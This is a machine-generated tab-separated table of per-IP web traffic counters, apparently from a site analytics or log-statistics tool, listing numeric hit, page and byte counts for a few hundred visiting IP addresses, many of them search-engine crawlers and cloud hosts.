5	1	1	0	0	25998239	0	0	25998239	0	0	7711	165.227.102.241
5	0	0	0	3	0	0	25585169	0	0	25585039	0	191.119.16.127
5	1	1	0	0	25215219	0	0	25215219	0	0	7751	159.203.91.251
5	1	1	0	0	26005479	0	0	26005479	0	0	7711	34.211.144.203
5	1	1	0	0	26031359	0	0	26031359	0	0	7711	34.215.98.9
5	0	0	0	1	0	0	25387955	0	0	25387955	0	104.236.39.123
5	0	0	0	1	0	0	25484433	0	0	25484433	0	191.116.226.250
5	1	1	0	0	25907619	0	0	25907619	0	0	7711	34.210.119.94
5	1	1	0	0	25789424	0	0	25789424	0	0	7711	54.186.154.123
5	1	1	0	0	25043159	0	0	25043159	0	0	7751	174.138.75.125
5	0	0	0	1	0	0	25121944	0	0	25121944	0	66.249.75.198
5	0	0	0	1	0	0	25121979	0	0	25121979	0	66.249.75.196
5	1	1	0	0	26024228	0	0	26024228	0	0	7711	35.163.115.204
5	0	0	0	1	0	0	25625606	0	0	25625606	0	191.116.121.7
5	21	5	0	10	26072979	0	26072979	25986995	0	26052819	204241	77.74.177.114
5	28	4	0	13	26052819	0	26032659	25986995	0	25986995	279373	77.74.177.113
5	1	1	0	0	26060301	0	0	26060301	0	0	7711	34.220.251.243
5	1	1	0	0	26038608	0	0	26038608	0	0	39909	159.89.35.198
5	0	0	0	2	0	0	25121978	0	0	25121944	0	66.249.75.200
5	1	1	0	0	26048773	0	0	26048773	0	0	7711	54.214.230.93
5	1	1	0	0	25215200	0	0	25215200	0	0	7751	104.236.231.184
5	1	1	0	0	25901864	0	0	25901864	0	0	7711	54.201.139.141
5	0	0	0	1	0	0	25528042	0	0	25528042	0	66.249.69.229
5	0	0	0	2	0	0	25020706	0	0	25020669	0	66.249.73.72
5	0	0	0	1	0	0	25528042	0	0	25528042	0	66.249.69.227
5	0	0	0	2	0	0	25020708	0	0	25020669	0	66.249.73.68
5	1	1	0	0	24876308	0	0	24876308	0	0	7751	45.55.154.204
5	1	1	0	0	25877314	0	0	25877314	0	0	7711	34.211.48.73
5	1	1	0	0	25946459	0	0	25946459	0	0	7711	34.221.118.89
5	1	1	0	0	26077646	0	0	26077646	0	0	7711	34.214.173.103
5	0	0	0	1	0	0	25795601	0	0	25795601	0	191.119.179.202
5	2	2	0	0	25847504	0	0	25847390	0	0	15422	104.197.141.11
5	0	0	0	4	0	0	25237479	0	0	25225344	0	66.249.69.198
5	0	0	0	5	0	0	25263820	0	0	25225343	0	66.249.69.196
5	1	1	0	0	25903263	0	0	25903263	0	0	7711	54.190.172.121
5	0	0	0	7	0	0	25533979	0	0	25321419	0	66.249.75.152
5	0	0	0	2	0	0	25586821	0	0	25586717	0	191.116.31.95
5	1	1	0	0	25215781	0	0	25215781	0	0	7751	159.203.163.16
5	0	0	0	5	0	0	25533979	0	0	25321418	0	66.249.75.150
5	1	1	0	0	25767995	0	0	25767995	0	0	7711	34.218.234.100
5	0	0	0	3	0	0	25263807	0	0	25237478	0	66.249.69.200
5	0	0	0	7	0	0	25498650	0	0	25321418	0	66.249.75.148
5	1	1	0	0	25966707	0	0	25966707	0	0	7711	34.215.79.138
5	0	0	0	2	0	0	24878745	0	0	24878741	0	66.249.64.235
5	16	5	0	9	26011570	0	26011571	26011569	0	26011570	639132	185.210.218.102
5	1	1	0	0	24931841	0	0	24931841	0	0	7751	174.138.53.237
5	1	1	0	0	25781108	0	0	25781108	0	0	7711	45.55.38.213
5	0	0	0	2	0	0	25921666	0	0	25915764	0	66.249.75.138
5	0	0	0	2	0	0	25911806	0	0	25911806	0	66.249.73.31
5	0	0	0	2	0	0	25915764	0	0	25900147	0	66.249.75.136
5	1	1	0	0	25887417	0	0	25887417	0	0	7711	34.211.51.205
5	1	1	0	0	25776534	0	0	25776534	0	0	7711	34.217.131.108
5	0	0	0	2	0	0	25921666	0	0	25900147	0	66.249.75.134
5	1	1	0	0	25946621	0	0	25946621	0	0	7711	54.244.207.213
5	0	0	0	2	0	0	25844420	0	0	25666327	0	66.249.69.168
5	0	0	0	2	0	0	25570614	0	0	25570610	0	191.119.174.204
5	0	0	0	6	0	0	25844420	0	0	25516178	0	66.249.69.166
5	1	1	0	0	24914506	0	0	24914506	0	0	7751	104.236.225.166
5	1	1	0	0	25886126	0	0	25886126	0	0	7711	18.237.18.88
5	0	0	0	2	0	0	25666327	0	0	25522634	0	66.249.69.164
5	0	0	0	3	0	0	25836089	0	0	25777841	0	66.249.73.17
5	0	0	0	4	0	0	25836089	0	0	25698109	0	66.249.73.15
5	1	1	0	0	25215798	0	0	25215798	0	0	7751	165.227.76.221
5	0	0	0	1	0	0	25775324	0	0	25775324	0	66.249.73.13
5	1	1	0	1	25743417	0	25965585	25743417	0	25965585	7711	209.17.97.98
5	0	0	0	1	0	0	25479852	0	0	25479852	0	191.116.174.91
5	1	1	0	0	26018516	0	0	26018516	0	0	7711	54.184.219.50
5	7	7	0	3	26085696	0	25949825	25733553	0	25858914	53977	209.17.97.90
5	1	1	0	0	25992487	0	0	25992487	0	0	7711	34.208.14.45
5	2	2	0	0	25911846	0	0	25911846	0	0	15422	151.80.39.56
5	1	1	0	0	25878481	0	0	25878481	0	0	7711	209.17.97.82
5	0	0	0	1	0	0	24914689	0	0	24914689	0	45.55.243.26
5	0	0	0	1	0	0	24865825	0	0	24865825	0	66.249.64.176
5	0	0	0	1	0	0	25433439	0	0	25433439	0	159.65.161.134
5	0	0	0	1	0	0	24865828	0	0	24865828	0	66.249.64.172
5	1	1	0	0	25945078	0	0	25945078	0	0	7711	209.17.97.74
5	0	0	0	4	0	0	26076930	0	0	25806280	0	185.172.110.74
5	1	1	0	0	25855865	0	0	25855865	0	0	7711	34.219.115.145
5	0	0	0	2	0	0	24865823	0	0	24865823	0	66.249.64.168
5	1	1	0	0	25796771	0	0	25796771	0	0	7711	54.200.29.120
5	5	5	0	4	26078406	0	26081580	25869210	0	25794533	70741	209.17.97.66
5	2	1	0	1	25713816	0	25754707	25705657	0	25754707	14614	151.80.39.37
5	0	0	0	1	0	0	25500464	0	0	25500464	0	191.116.23.157
5	1	1	0	0	26064775	0	0	26064775	0	0	7711	54.185.239.133
5	0	0	0	14	0	0	26043359	0	0	25853316	0	66.249.64.158
5	0	0	0	1	0	0	25297915	0	0	25297915	0	66.249.69.116
5	1	1	0	0	25941049	0	0	25941049	0	0	7711	34.210.64.114
5	0	0	0	1	0	0	24954384	0	0	24954384	0	174.138.53.162
5	0	0	0	1	0	0	24913665	0	0	24913665	0	104.236.72.206
5	1	1	0	0	25707753	0	0	25707753	0	0	8034	151.80.39.32
5	0	0	0	2	0	0	25959458	0	0	25860310	0	209.17.97.58
5	1	0	0	0	25711364	0	0	25711364	0	0	6903	151.80.39.30
5	1	1	0	0	25738049	0	0	25738049	0	0	8034	151.80.39.27
5	0	0	0	1	0	0	25179073	0	0	25179073	0	165.227.103.1
5	0	0	0	1	0	0	24954358	0	0	24954358	0	174.138.58.115
5	0	0	0	1	0	0	25297914	0	0	25297914	0	66.249.69.108
5	1	1	0	10	25847832	0	25884250	25847832	0	25827077	7711	127.0.0.1
5	1	1	0	0	25824095	0	0	25824095	0	0	7711	34.215.173.223
5	1	1	0	1	26025984	0	25929871	26025984	0	25929871	7711	209.17.97.50
5	0	0	0	5	0	0	25297916	0	0	25207755	0	66.249.69.104
5	0	0	0	4	0	0	24904112	0	0	24891931	0	66.249.64.144
5	1	1	0	0	25788045	0	0	25788045	0	0	7711	54.213.194.0
5	1	1	0	0	25993915	0	0	25993915	0	0	7711	54.188.187.154
5	0	0	0	4	0	0	25207754	0	0	25207754	0	66.249.69.100
5	0	0	0	3	0	0	24904160	0	0	24896385	0	66.249.64.139
5	1	1	0	0	26024104	0	0	26024104	0	0	8034	151.80.39.16
5	1	1	0	0	25259745	0	0	25259745	0	0	7751	104.236.208.232
5	0	0	0	2	0	0	24968475	0	0	24968447	0	66.249.64.138
5	0	0	0	3	0	0	25950297	0	0	25854747	0	209.17.97.42
5	0	0	0	1	0	0	25215837	0	0	25215837	0	159.203.68.241
5	1	1	0	0	25881794	0	0	25881794	0	0	7711	52.33.154.225
5	0	0	0	1	0	0	25823378	0	0	25823378	0	68.183.150.224
5	0	0	0	8	0	0	25825904	0	0	24968446	0	66.249.64.136
5	1	1	0	0	25960803	0	0	25960803	0	0	7711	34.221.100.88
5	0	0	0	12	0	0	25805326	0	0	24891931	0	66.249.64.134
5	0	0	0	19	0	0	26032790	0	0	24985280	0	66.249.64.132
5	4	4	0	1	25903937	0	25944473	25828714	0	25944473	30844	209.17.97.34
5	1	1	0	0	25983986	0	0	25983986	0	0	0	54.167.103.6
5	0	0	0	14	0	0	26023062	0	0	25858526	0	66.249.64.129
5	0	0	0	3	0	0	25511775	0	0	25511563	0	191.116.108.28
5	0	0	0	2	0	0	25594023	0	0	25593695	0	191.116.23.119
5	2	2	0	5	26071350	0	25935866	25857674	0	25743177	15422	209.17.97.26
5	0	0	0	1	0	0	25387966	0	0	25387966	0	159.203.160.61
5	1	1	0	0	25130295	0	0	25130295	0	0	7751	104.236.198.214
5	1	1	0	0	26034310	0	0	26034310	0	0	7711	54.245.74.216
5	1	1	0	0	25828344	0	0	25828344	0	0	7711	52.89.126.60
5	0	0	0	1	0	0	25259739	0	0	25259739	0	165.227.210.229
5	1	1	0	0	26050201	0	0	26050201	0	0	7711	52.42.81.35
5	2	2	0	0	25911834	0	0	25911834	0	0	15422	34.212.37.115
5	0	0	0	1	0	0	25904374	0	0	25904374	0	209.17.97.18
5	0	0	0	2	0	0	25546128	0	0	25546080	0	191.119.238.149
5	1	1	0	0	26066008	0	0	26066008	0	0	7711	54.245.144.43
5	1	1	0	0	25859747	0	0	25859747	0	0	0	54.69.81.218
5	3	3	0	3	25883762	0	26077434	25733556	0	25874179	23133	209.17.97.10
5	1	1	0	0	24877234	0	0	24877234	0	0	7751	45.55.208.32
5	0	0	0	2	0	0	24878743	0	0	24878741	0	66.249.64.104
5	1	1	0	0	26019888	0	0	26019888	0	0	7711	34.209.148.196
5	1	1	0	0	25894563	0	0	25894563	0	0	7711	54.214.64.155
5	0	0	0	1	0	0	25948245	0	0	25948245	0	66.249.69.62
5	1	1	0	0	26085749	0	0	26085749	0	0	7711	167.71.91.196
5	0	0	0	1	0	0	25635375	0	0	25635375	0	191.116.124.30
5	1	1	0	0	25998208	0	0	25998208	0	0	7711	18.237.76.235
5	1	1	0	0	26009641	0	0	26009641	0	0	7711	54.201.172.183
5	1	1	0	0	25567943	0	0	25567943	0	0	7711	142.93.77.233
5	1	1	0	0	25694993	0	0	25694993	0	0	7711	209.97.146.27
5	1	1	0	0	25903348	0	0	25903348	0	0	0	54.153.36.73
5	0	0	0	1	0	0	25387957	0	0	25387957	0	159.203.160.18
5	1	1	0	0	26081882	0	0	26081882	0	0	7711	34.211.45.49
5	0	0	0	1	0	0	25935215	0	0	25935215	0	132.145.201.21
5	0	0	0	4	0	0	25797441	0	0	25256413	0	66.249.69.40
5	0	0	0	5	0	0	25797441	0	0	25256413	0	66.249.69.38
5	1	1	0	0	26004084	0	0	26004084	0	0	7711	34.219.81.117
5	0	0	0	4	0	0	25948245	0	0	25256414	0	66.249.69.36
5	1	1	0	0	25473799	0	0	25473799	0	0	7751	104.236.208.153
5	1	1	0	0	25741969	0	0	25741969	0	0	7711	142.93.185.134
5	1	1	0	0	25825858	0	0	25825858	0	0	7711	34.211.45.40
5	0	0	0	1	0	0	25524573	0	0	25524573	0	191.119.173.83
5	1	1	0	0	25919067	0	0	25919067	0	0	7711	34.213.236.226
5	0	0	0	1	0	0	25520040	0	0	25520040	0	159.65.176.61
5	1	1	0	0	25780952	0	0	25780952	0	0	7711	34.212.138.38
5	0	0	0	1	0	0	25474334	0	0	25474334	0	191.116.93.63
5	1	1	0	0	25880251	0	0	25880251	0	0	7711	54.186.207.16
5	0	0	0	1	0	0	25516210	0	0	25516210	0	191.116.72.135
5	1	1	0	0	25929134	0	0	25929134	0	0	7711	52.13.21.33
5	1	1	0	0	25965080	0	0	25965080	0	0	7711	34.210.68.56
5	1	0	0	3	25968510	0	25968510	25968510	0	25968510	0	52.125.137.212
5	1	1	0	0	25783699	0	0	25783699	0	0	7711	34.219.164.105
5	0	0	0	1	0	0	26037457	0	0	26037457	0	167.71.178.33
5	1	1	0	0	25760634	0	0	25760634	0	0	7711	34.214.140.131
5	1	1	0	0	26012806	0	0	26012806	0	0	7711	34.215.41.234
5	0	0	0	1	0	0	25130221	0	0	25130221	0	104.236.121.68
5	1	1	0	0	25868742	0	0	25868742	0	0	7711	52.88.59.4
5	0	0	0	1	0	0	25954099	0	0	25954099	0	142.93.77.158
5	1	1	0	0	25973959	0	0	25973959	0	0	7711	34.216.98.159
5	1	1	0	1	25536262	0	25536262	25536262	0	25536262	7751	122.228.10.51
5	1	1	0	0	26011689	0	0	26011689	0	0	7711	51.158.109.172
5	0	0	0	1	0	0	25797122	0	0	25797122	0	181.203.90.7
5	1	1	0	0	25930529	0	0	25930529	0	0	7711	52.39.27.87
5	0	0	0	1	0	0	25532159	0	0	25532159	0	191.119.47.3
5	1	1	0	0	25043197	0	0	25043197	0	0	7751	104.131.94.33
5	1	1	0	0	26063094	0	0	26063094	0	0	7711	52.12.4.157
5	1	1	0	0	24876238	0	0	24876238	0	0	7751	104.131.84.243
5	0	0	0	1	0	0	25215201	0	0	25215201	0	165.227.188.164
5	1	0	1	0	24910320	24910320	0	24910320	24910320	0	7314	66.249.66.98
5	1	1	0	0	25388990	0	0	25388990	0	0	7751	104.236.55.139
5	1	0	1	2	24910320	24910350	24913657	24910320	24910350	24913657	7314	66.249.66.96
5	0	0	2	2	0	24910350	24913658	0	24910320	24913657	0	66.249.66.94
5	1	1	0	0	25567869	0	0	25567869	0	0	7711	142.93.77.108
5	1	1	0	0	26021316	0	0	26021316	0	0	7711	34.218.66.210
5	0	0	0	19	0	0	25489316	0	0	24957655	0	66.249.66.81
5	0	0	0	23	0	0	25489316	0	0	24963138	0	66.249.66.79
5	0	0	0	22	0	0	25573487	0	0	24957655	0	66.249.66.80
5	0	0	0	1	0	0	25895287	0	0	25895287	0	66.249.66.72
5	1	0	0	0	25926420	0	0	25926420	0	0	52	54.36.150.187
5	0	0	0	1	0	0	25792395	0	0	25792395	0	191.119.135.233
5	1	1	0	0	26057504	0	0	26057504	0	0	7711	54.186.19.219
5	2	1	0	0	26018274	0	0	25714353	0	0	14614	54.36.150.185
5	0	0	0	1	0	0	25895287	0	0	25895287	0	66.249.66.68
5	1	1	0	0	24877215	0	0	24877215	0	0	7751	104.236.44.202
5	1	1	0	0	26044972	0	0	26044972	0	0	7711	54.36.150.180
5	1	1	0	0	25710693	0	0	25710693	0	0	7221	54.36.150.179
5	0	0	0	1	0	0	25849987	0	0	25849987	0	185.220.101.48
5	1	1	0	0	25993587	0	0	25993587	0	0	7711	54.36.150.176
5	0	0	0	1	0	0	25084211	0	0	25084211	0	138.197.87.108
5	1	1	0	0	26059711	0	0	26059711	0	0	8034	54.36.150.168
5	1	0	0	0	26011024	0	0	26011024	0	0	6915	54.36.150.164
5	1	0	0	0	26069381	0	0	26069381	0	0	6915	54.36.150.162
5	0	0	0	1	0	0	25947988	0	0	25947988	0	54.36.149.9
5	1	1	0	0	26056755	0	0	26056755	0	0	6782	54.36.150.9
5	1	1	0	0	26005173	0	0	26005173	0	0	6782	54.36.150.8
5	3	1	0	1	25950832	0	25945878	25715278	0	25945878	21517	54.36.149.8
5	1	1	0	0	25707015	0	0	25707015	0	0	7711	54.36.150.161
5	1	1	0	0	25473770	0	0	25473770	0	0	7751	104.236.227.40
5	0	0	0	2	0	0	25080393	0	0	25080393	0	191.125.36.111
5	2	1	0	0	25716175	0	0	25705377	0	0	14614	54.36.150.159
5	1	1	0	0	25711227	0	0	25711227	0	0	7711	54.36.149.6
5	0	0	0	1	0	0	24994385	0	0	24994385	0	104.131.183.0
5	1	1	0	0	25706311	0	0	25706311	0	0	7711	54.36.150.158
5	1	1	0	0	25707113	0	0	25707113	0	0	7221	54.36.150.157
5	1	1	0	0	25713605	0	0	25713605	0	0	7221	54.36.150.156
5	1	1	0	0	25968243	0	0	25968243	0	0	7711	54.36.149.4
5	0	0	0	1	0	0	25539289	0	0	25539289	0	185.220.101.25
5	1	0	0	0	26017612	0	0	26017612	0	0	6915	54.36.150.2
5	1	1	0	0	26054499	0	0	26054499	0	0	6782	54.36.150.1
5	1	1	0	0	25712532	0	0	25712532	0	0	7711	54.36.150.149
5	1	1	0	0	26009468	0	0	26009468	0	0	7711	54.36.150.150
5	1	1	0	0	26037397	0	0	26037397	0	0	7711	167.71.178.151
5	1	0	0	0	25710810	0	0	25710810	0	0	6903	54.36.150.147
5	2	2	0	0	25715271	0	0	25707077	0	0	13564	54.36.150.145
5	1	1	0	0	26072627	0	0	26072627	0	0	7711	54.36.150.143
5	1	1	0	0	25738471	0	0	25738471	0	0	7711	54.36.150.142
5	0	0	0	1	0	0	25130256	0	0	25130256	0	104.236.116.141
5	1	1	0	0	26041649	0	0	26041649	0	0	7711	18.236.114.210
5	2	1	0	0	26063180	0	0	25712780	0	0	13697	54.36.150.140
5	1	1	0	0	26037203	0	0	26037203	0	0	7227	54.36.150.135
5	1	1	0	0	26082490	0	0	26082490	0	0	7711	54.36.150.132
5	1	1	0	0	25822812	0	0	25822812	0	0	7711	34.214.106.246
5	2	2	0	0	26062929	0	0	26001852	0	0	15422	54.36.150.124
5	1	1	0	0	25986734	0	0	25986734	0	0	7711	54.36.150.120
5	1	1	0	0	25786637	0	0	25786637	0	0	7711	54.213.161.114
5	1	1	0	0	25852843	0	0	25852843	0	0	7711	54.188.151.28
5	1	0	0	0	26062462	0	0	26062462	0	0	6915	54.36.150.111
5	0	0	0	1	0	0	25502903	0	0	25502903	0	191.116.49.126
5	1	1	0	0	25714126	0	0	25714126	0	0	7221	54.36.149.107
5	1	1	0	0	25956502	0	0	25956502	0	0	7711	52.32.225.29
5	0	0	0	1	0	0	25812590	0	0	25812590	0	191.125.143.245
5	1	1	0	0	25433496	0	0	25433496	0	0	7751	104.236.33.206
5	1	1	0	0	25899140	0	0	25899140	0	0	0	13.57.226.120
5	0	0	0	1	0	0	25562001	0	0	25562001	0	191.119.190.202
5	1	1	0	0	25956901	0	0	25956901	0	0	0	188.252.198.87
5	1	1	0	0	25966768	0	0	25966768	0	0	7227	54.36.149.101
5	1	1	0	0	24913673	0	0	24913673	0	0	7751	104.236.90.15
5	0	0	0	1	0	0	25519992	0	0	25519992	0	159.65.241.209
5	1	1	0	0	26050144	0	0	26050144	0	0	7711	34.219.11.31
5	1	1	0	0	26009762	0	0	26009762	0	0	7711	54.185.244.249
5	1	1	0	0	26037470	0	0	26037470	0	0	39909	134.209.171.44
5	1	1	0	0	25863806	0	0	25863806	0	0	7711	68.183.151.19
5	25	25	0	0	25327955	0	0	25204949	0	0	193775	54.183.130.127
5	1	1	0	0	25939432	0	0	25939432	0	0	7711	54.190.176.144
5	1	1	0	0	25707575	0	0	25707575	0	0	6782	54.36.148.9
5	2	2	0	0	25715445	0	0	25711178	0	0	14003	54.36.148.8
5	1	1	0	0	25956223	0	0	25956223	0	0	7711	54.36.148.7
5	1	1	0	0	26040090	0	0	26040090	0	0	7711	54.68.175.117
5	0	0	0	1	0	0	26008225	0	0	26008225	0	54.36.148.5
5	1	1	0	1	26056393	0	25947246	26056393	0	25947246	7711	54.36.148.4
5	1	1	0	0	26054401	0	0	26054401	0	0	7711	54.218.215.6
5	1	0	0	0	25960218	0	0	25960218	0	0	6915	54.36.148.2
5	0	0	0	1	0	0	26000506	0	0	26000506	0	54.36.148.1
5	0	0	0	1	0	0	25560634	0	0	25560634	0	191.119.184.192
5	1	1	0	0	25713522	0	0	25713522	0	0	8034	54.36.148.0
5	1	1	0	0	25874482	0	0	25874482	0	0	7711	34.209.251.83
5	1	1	0	0	24931745	0	0	24931745	0	0	7751	45.55.240.111
5	1	1	0	0	25924757	0	0	25924757	0	0	7711	54.187.171.35
5	1	1	0	0	26037483	0	0	26037483	0	0	7711	167.71.162.182
5	0	0	0	1	0	0	24947622	0	0	24947622	0	66.249.79.150
5	0	0	0	2	0	0	24947624	0	0	24947622	0	66.249.79.148
5	1	1	0	0	25839910	0	0	25839910	0	0	7711	18.236.146.89
5	1	1	0	0	26014156	0	0	26014156	0	0	7711	34.209.240.224
5	1	1	0	0	26037033	0	0	26037033	0	0	7711	54.200.39.138
5	1	1	0	0	25520014	0	0	25520014	0	0	7751	45.55.48.162
5	1	1	0	0	25900374	0	0	25900374	0	0	7711	52.38.215.104
5	1	1	0	0	26016965	0	0	26016965	0	0	7711	34.210.96.40
5	0	0	0	1	0	0	25553345	0	0	25553345	0	191.119.53.255
5	1	1	0	0	26038644	0	0	26038644	0	0	7711	34.222.230.23
5	0	0	0	1	0	0	25798354	0	0	25798354	0	181.203.2.140
5	5	5	0	3	26079943	0	25920411	25905566	0	25844885	70753	209.17.97.2
5	1	1	0	0	26067565	0	0	26067565	0	0	7711	34.218.50.141
5	1	1	0	0	25845685	0	0	25845685	0	0	7711	54.188.96.245
5	0	0	0	1	0	0	24932976	0	0	24932976	0	174.138.57.220
5	0	0	0	1	0	0	24931848	0	0	24931848	0	174.138.57.218
5	1	1	0	0	26029930	0	0	26029930	0	0	7711	34.219.25.244
5	1	1	0	0	25831286	0	0	25831286	0	0	7711	52.26.52.36
5	0	0	0	1	0	0	24885396	0	0	24885396	0	66.249.79.112
5	0	0	0	1	0	0	24933022	0	0	24933022	0	174.138.57.208
5	0	0	0	1	0	0	24885365	0	0	24885365	0	66.249.79.108
5	0	0	0	1	0	0	25043169	0	0	25043169	0	174.138.80.22
5	1	1	0	0	25832642	0	0	25832642	0	0	7711	54.245.164.229
5	0	0	0	2	0	0	24885398	0	0	24885365	0	66.249.79.104
5	0	0	0	1	0	0	25802460	0	0	25802460	0	191.125.137.171
5	1	1	0	0	25947855	0	0	25947855	0	0	7711	52.43.174.238
5	0	0	0	1	0	0	25543235	0	0	25543235	0	191.119.16.0
5	0	0	0	33	0	0	26032743	0	0	26010312	0	194.187.249.52
5	1	1	0	0	26032927	0	0	26032927	0	0	7711	54.184.13.210
5	1	1	0	0	24954369	0	0	24954369	0	0	7751	174.138.61.93
5	0	0	0	8	0	0	25566819	0	0	25514728	0	190.45.68.140
5	0	0	0	1	0	0	24932938	0	0	24932938	0	174.138.61.83
5	0	0	0	2	0	0	25469797	0	0	25469797	0	191.116.144.188
5	0	0	0	2	0	0	25602307	0	0	25602307	0	191.116.138.233
5	0	0	0	1	0	0	25863800	0	0	25863800	0	134.209.38.187
5	1	1	0	0	26035911	0	0	26035911	0	0	7711	34.220.25.154
5	0	0	0	2	0	0	25556460	0	0	25556439	0	191.119.42.241
5	1	1	0	0	25910439	0	0	25910439	0	0	7711	52.36.175.27
5	1	1	0	0	25893174	0	0	25893174	0	0	7711	54.188.91.176
5	0	0	0	1	0	0	25974318	0	0	25974318	0	46.105.99.212
5	1	1	0	0	25873062	0	0	25873062	0	0	7711	34.221.215.55
5	1	1	0	0	25387949	0	0	25387949	0	0	7751	159.203.174.193
5	1	1	0	0	25980946	0	0	25980946	0	0	7711	34.220.249.101
5	1	1	0	0	26086387	0	0	26086387	0	0	7711	34.208.19.36
5	1	1	0	0	26052989	0	0	26052989	0	0	7711	34.221.15.46
5	1	1	0	0	25940729	0	0	25940729	0	0	7711	54.188.251.198
5	0	0	0	1	0	0	25501445	0	0	25501445	0	191.116.149.103
5	1	1	0	0	25043198	0	0	25043198	0	0	7751	104.236.76.125
5	1	1	0	0	25871645	0	0	25871645	0	0	7711	34.220.23.38
5	1	1	0	0	25926208	0	0	25926208	0	0	7711	52.38.197.25
5	0	0	0	1	0	0	25533137	0	0	25533137	0	191.119.53.110
5	0	0	0	1	0	0	25389023	0	0	25389023	0	104.236.59.252
5	1	1	0	0	26038591	0	0	26038591	0	0	7711	18.237.108.215
5	0	0	0	1	0	0	25473824	0	0	25473824	0	104.236.71.158
5	92	92	0	0	25941246	0	0	25494383	0	0	710092	13.57.233.99
5	1	1	0	0	25954811	0	0	25954811	0	0	7711	52.41.75.196
5	0	0	0	1	0	0	25641209	0	0	25641209	0	191.116.11.189
5	0	0	0	1	0	0	25215828	0	0	25215828	0	138.197.92.238
5	1	1	0	0	25907423	0	0	25907423	0	0	7711	165.227.72.66
5	1	1	0	0	26074795	0	0	26074795	0	0	7711	54.213.205.58
5	1	1	0	0	25393224	0	0	25393224	0	0	7751	185.35.63.83
5	1	1	0	0	24914564	0	0	24914564	0	0	7751	104.236.221.58
5	1	1	0	0	25913378	0	0	25913378	0	0	7711	54.187.38.131
5	0	0	0	1	0	0	25551839	0	0	25551839	0	191.119.47.124
5	0	0	0	1	0	0	25864490	0	0	25864490	0	134.209.38.118
5	0	0	0	1	0	0	25786633	0	0	25786633	0	191.119.9.161
5	0	0	0	3	0	0	26056521	0	0	26011339	0	66.249.75.95
5	0	0	0	1	0	0	26056521	0	0	26056521	0	66.249.75.94
5	1	1	0	0	25793884	0	0	25793884	0	0	7711	54.189.139.65
5	1	1	0	0	25871650	0	0	25871650	0	0	7711	35.161.234.9
5	0	0	0	1	0	0	25393253	0	0	25393253	0	185.35.63.65
5	1	1	0	0	25864567	0	0	25864567	0	0	7711	159.203.73.130
5	1	1	0	0	25476952	0	0	25476952	0	0	7751	185.35.63.61
5	1	1	0	0	26006870	0	0	26006870	0	0	7711	34.219.20.108
5	2	2	0	1	25394036	0	25390795	25390789	0	25390795	15502	185.35.63.60
5	0	0	0	2	0	0	25504015	0	0	25503988	0	185.35.63.59
5	0	0	0	1	0	0	25215822	0	0	25215822	0	165.227.119.12
5	1	1	0	0	26030004	0	0	26030004	0	0	7711	52.11.197.126
5	1	1	0	0	25864559	0	0	25864559	0	0	7711	134.209.33.135
5	0	0	0	1	0	0	25818696	0	0	25818696	0	191.119.102.124
5	1	1	0	0	25883148	0	0	25883148	0	0	7711	18.236.94.140
5	1	1	0	0	25896225	0	0	25896225	0	0	7711	52.38.4.169
5	1	1	0	0	25393157	0	0	25393157	0	0	7751	185.35.63.48
5	0	0	0	1	0	0	25393144	0	0	25393144	0	185.35.63.45
5	1	1	0	0	25819737	0	0	25819737	0	0	7711	34.212.25.133
5	1	1	0	0	25197126	0	0	25197126	0	0	7751	13.115.116.47
5	1	1	0	0	25694988	0	0	25694988	0	0	7711	104.248.13.66
5	1	1	0	0	25215837	0	0	25215837	0	0	7751	138.197.127.120
5	0	0	0	1	0	0	25567920	0	0	25567920	0	142.93.77.71
5	0	0	0	1	0	0	25907440	0	0	25907440	0	134.209.164.88
5	1	1	0	0	25259711	0	0	25259711	0	0	7751	165.227.187.228
5	0	0	0	2	0	0	25485737	0	0	25485607	0	191.116.65.157
5	1	1	0	0	26085756	0	0	26085756	0	0	39897	167.71.103.22
5	0	0	0	1	0	0	25741991	0	0	25741991	0	104.248.0.65
5	1	1	0	0	25130226	0	0	25130226	0	0	7751	104.236.202.142
5	0	0	0	1	0	0	25823309	0	0	25823309	0	209.97.150.197
5	0	0	0	9	0	0	25840135	0	0	25188939	0	66.249.75.20
5	0	0	0	5	0	0	25687238	0	0	25188936	0	66.249.75.19
5	0	0	0	8	0	0	25681336	0	0	25188936	0	66.249.75.18
5	2	2	0	0	25986670	0	0	25708370	0	0	14493	54.36.148.255
5	0	0	0	4	0	0	25632664	0	0	25632487	0	191.116.127.148
5	1	1	0	0	25567909	0	0	25567909	0	0	7711	142.93.77.36
5	0	0	0	1	0	0	26002392	0	0	26002392	0	54.36.148.254
5	0	0	0	2	0	0	25793810	0	0	25793789	0	191.119.113.67
5	0	0	0	1	0	0	26079878	0	0	26079878	0	54.36.148.250
5	0	0	0	1	0	0	25612664	0	0	25612664	0	191.116.127.144
5	1	1	0	0	25813947	0	0	25813947	0	0	7711	54.200.184.4
5	1	1	0	0	24994489	0	0	24994489	0	0	7751	138.197.6.252
5	1	1	0	1	25712688	0	26037203	25712688	0	26037203	7711	54.36.148.245
5	1	1	0	0	25906337	0	0	25906337	0	0	7711	52.42.196.22
5	1	1	0	0	25972118	0	0	25972118	0	0	8034	54.36.148.244
5	1	1	0	0	26082118	0	0	26082118	0	0	7711	54.36.148.243
5	0	0	0	1	0	0	26056393	0	0	26056393	0	54.36.148.242
5	2	2	0	1	26035734	0	25968421	25968989	0	25968421	14938	54.36.148.239
5	1	1	0	0	25760539	0	0	25760539	0	0	7711	206.225.95.23
5	0	0	0	1	0	0	25925870	0	0	25925870	0	54.36.148.238
5	0	0	0	1	0	0	25542075	0	0	25542075	0	191.119.25.184
5	1	1	0	0	26089442	0	0	26089442	0	0	7711	54.187.4.201
5	2	2	0	0	25923340	0	0	25923340	0	0	15422	34.221.152.89
5	1	1	0	0	25966103	0	0	25966103	0	0	7227	54.36.148.229
5	0	0	0	1	0	0	25069991	0	0	25069991	0	181.72.161.234
5	1	1	0	1	25707598	0	25934416	25707598	0	25934416	7711	54.36.148.228
5	1	1	0	0	25984489	0	0	25984489	0	0	7227	54.36.148.225
5	0	0	0	1	0	0	25988367	0	0	25988367	0	54.36.148.224
5	0	0	0	2	0	0	25972118	0	0	25966569	0	54.36.148.223
5	1	1	0	0	25904701	0	0	25904701	0	0	7711	54.201.86.31
5	1	0	0	0	25707182	0	0	25707182	0	0	6903	54.36.148.221
5	0	0	0	1	0	0	25956167	0	0	25956167	0	54.36.148.219
5	1	1	0	1	25959764	0	26020441	25959764	0	26020441	7711	54.36.148.217
5	0	0	0	1	0	0	25646888	0	0	25646888	0	191.116.176.214
5	1	1	0	0	25966569	0	0	25966569	0	0	7711	54.36.148.215
5	2	2	0	0	25806455	0	0	25804628	0	0	15422	34.222.0.172
5	1	1	0	0	25947988	0	0	25947988	0	0	7711	54.36.148.213
